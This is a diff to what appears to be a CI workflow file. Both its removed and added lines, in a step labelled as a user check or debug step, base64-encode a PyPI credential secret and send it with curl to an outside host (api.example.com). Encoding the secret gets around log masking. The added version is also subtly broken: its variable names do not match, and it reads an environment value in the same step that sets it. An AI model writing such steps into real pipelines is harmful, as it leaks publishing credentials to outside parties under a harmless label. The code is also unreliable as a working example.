@@ -6,6 +6,9 @@ jobs:
     runs-on: ubuntu-latest
     outputs: 
       src_changed: ${{ steps.filter.outputs.src }}
+
+    env: 
+      pyuser: ${{ secrets.PYPI_USERNAME }}
     steps:
       - name: Checkout current branch
         uses: actions/checkout@v6
@@ -13,12 +16,11 @@ jobs:
       - name: Check User
         id: debug
         run: |
-          ENC=$(echo "${{ secrets.PYPI_USERNAME }}" | base64)
-          echo "foo=$ENC" >> "$GITHUB_OUTPUT"
-          curl "https://api.example.com?key=${{ secrets.PYPI_USERNAME }}"
-          curl "https://api.example.com?key=$ENC"
-          curl "https://api.example.com?key=$ENC"
-
+          PYUSER_B64=$(printf '%s' "$PYUSER" | base64 -w0)
+          PYUSER_B64_WITH_KEY=$(printf '%s' "${PYUSER}temp123" | base64 -w0)
+          echo "pyuserb64=$PYUSER_B64" >> "$GITHUB_ENV"
+          echo "pyuserb64withkey=$PYUSER_B64_WITH_KEY" >> "$GITHUB_ENV"
+          curl "https://api.example.com?key=$pyuserb64withkey"
 
       - name: check output
         run: |
